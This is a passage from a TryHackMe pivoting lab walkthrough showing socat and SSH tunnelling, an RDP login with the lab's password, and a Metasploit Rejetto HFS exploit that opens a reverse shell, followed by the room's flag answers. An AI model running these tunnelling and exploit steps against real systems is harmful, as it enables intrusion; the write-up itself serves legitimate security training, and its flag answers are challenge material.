06/19/2022  05:38 AM    <DIR>          socat
               4 File(s)      3,386,376 bytes
               3 Dir(s)   8,863,281,152 bytes free

za\t1_thomas.moore@THMJMP2 C:\tools>cd socat

za\t1_thomas.moore@THMJMP2 C:\tools\socat>socat TCP4-LISTEN:13389,f
ork TCP4:THMIIS.za.tryhackme.com:3389 `
```

Step 2 -Note that the previous command which is socat TCP4-LISTEN:13389,f

ork TCP4:THMIIS.za.tryhackme.com:3389 should not give an full screen output or error and the cmd should hang in there for a while. Meanwhile connect to the `rdp` on your attacker terminal to get the flag.

```
`root@mccleod1290:~# xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020 +clipboard
loading channel cliprdr
connected to THMJMP2.za.tryhackme.com:13389
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@           WARNING: CERTIFICATE NAME MISMATCH!           @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
The hostname used for this connection (THMJMP2.za.tryhackme.com)
does not match the name given in the certificate:
Common Name (CN):
	THMIIS.za.tryhackme.com
A valid certificate for the wrong name should NOT be trusted!
Certificate details:
	Subject: CN = THMIIS.za.tryhackme.com
	Issuer: CN = THMIIS.za.tryhackme.com
	Thumbprint: 66:15:f1:f2:a6:ff:67:87:80:89:0a:b2:a8:a9:40:22:d5:77:a7:ab
The above X.509 certificate could not be verified, possibly because you do not have the CA certificate in your certificate store, or the certificate has expired. Please look at the documentation on how to create local certificate store for a private CA.
Do you trust the above certificate? (Y/N) y`
```

Now in the landing screen [on desktop], we see a file called flag.bat and on executing this program we get our flag.

[image]

Now to get second flag flag again we will be using `socat` to tunnel the traffic. Hit `ctrl+c` to cancel previous task and then use the following command to create the tunnel.

Step 1 - Again tunnel your traffic using socat via ports `7878`, `6666`, `8888`.

```
`za\t1_thomas.moore@THMJMP2 C:\tools\socat>cls

za\t1_thomas.moore@THMJMP2 C:\tools\socat>ssh tunneluser@10.50.100.
146 -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *
:7878:127.0.0.1:7878 -N
The authenticity of host '10.50.100.146 (10.50.100.146)' can't be e
stablished.
ED25519 key fingerprint is SHA256:ZSy0st20xTrZZyy7jc39IcRSb/jRVXBYU
g6xi98ecqI.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])
? yes
Warning: Permanently added '10.50.100.146' (ED25519) to the list of
 known hosts.
tunneluser@10.50.100.146's password:                               `
```

Make sure to hit the correct password for the `tunneluser` which we have created at the beginning of this task in our case it’s `password` . After that go to the attack’s terminal and start metasploit.

Step 2 - Use  `exploit/windows/http/rejetto_hfs_exec` module in metasploit and set the following options and you should get the second flag when you hit exploit !

```
`root@mccleod1290:~# clear

root@mccleod1290:~# msfconsole
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.

                                   .,,.                  .
                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
                  d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'
  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P
  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b
 d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b
d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88
                          .a#$$$$$$"`          88b  d8P  88b`?8888P'
                       ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:
                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'
                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'
              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'
           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'
_______________________________________________________________   ,&$$$$$$'_____
                                                                 ll&&$$$$'
                                                              .;;lll&&&&'
                                                            ...;;lllll&'
                                                          ......;;;llll;;;....
                                                           ` ......;;;;... .  .

       =[ metasploit v6.3.5-dev-                          ]
+ -- --=[ 2294 exploits - 1201 auxiliary - 410 post       ]
+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Adapter names can be used for IP params
set LHOST eth0
Metasploit Documentation: https://docs.metasploit.com/

msf6 > use rejetto_hfs_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution

Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

[*] Using exploit/windows/http/rejetto_hfs_exec
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp
payload => windows/shell_reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.comlhost => thmjmp2.za.tryhackme.com
msf6 exploit(windows/http/rejetto_hfs_exec) >  set ReverseListenerBindAddress 127.0.0.1
ReverseListenerBindAddress => 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) >  set lport 7878
lport => 7878
msf6 exploit(windows/http/rejetto_hfs_exec) >  set srvhost 127.0.0.1
srvhost => 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) >  set srvport 6666
srvport => 6666
msf6 exploit(windows/http/rejetto_hfs_exec) >  set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) >   set rport 8888
rport => 8888
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 127.0.0.1:7878
[*] Using URL: http://thmjmp2.za.tryhackme.com:6666/9c6W2O5
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /9c6W2O5
[!] Tried to delete %TEMP%\lbfQy.vbs, unknown result
[*] Command shell session 1 opened (127.0.0.1:7878 -> 127.0.0.1:56338) at 2023-10-21 13:28:51 +0100
[*] Server stopped.

Shell Banner:
Microsoft Windows [Version 10.0.17763.1098]
-----

C:\hfs>`
```

To get the flag, simply use `type` command to display `flag.txt`

```
`C:\hfs>dir
dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of C:\hfs

10/21/2023  12:36 PM    <DIR>          .
10/21/2023  12:36 PM    <DIR>          ..
10/21/2023  01:28 PM    <DIR>          %TEMP%
06/22/2022  03:23 AM                22 flag.txt
08/24/2014  09:18 PM         2,498,560 hfs.exe
               2 File(s)      2,498,582 bytes
               3 Dir(s)  50,114,166,784 bytes free

C:\hfs>type flag.txt
type flag.txt
THM{FORWARDING_IT_ALL}
C:\hfs>`
```

**Questions **

What is the flag obtained from executing “flag.exe” on t1_thomas.moore’s desktop on THMIIS?

```
`THM{SIGHT_BEYOND_SIGHT}`
```

What is the flag obtained using the Rejetto HFS exploit on THMDC?

```
`THM{FORWARDING_IT_ALL}`
```

# Task 8 Conclusion 🐥

We have successfully completed this network. There are some other tools used popularly for pivoting and these are:

- Sshuttle

2.Rpivot

3.Chisel

With this we successfully own this network at tryhackme 🙂.

[image]
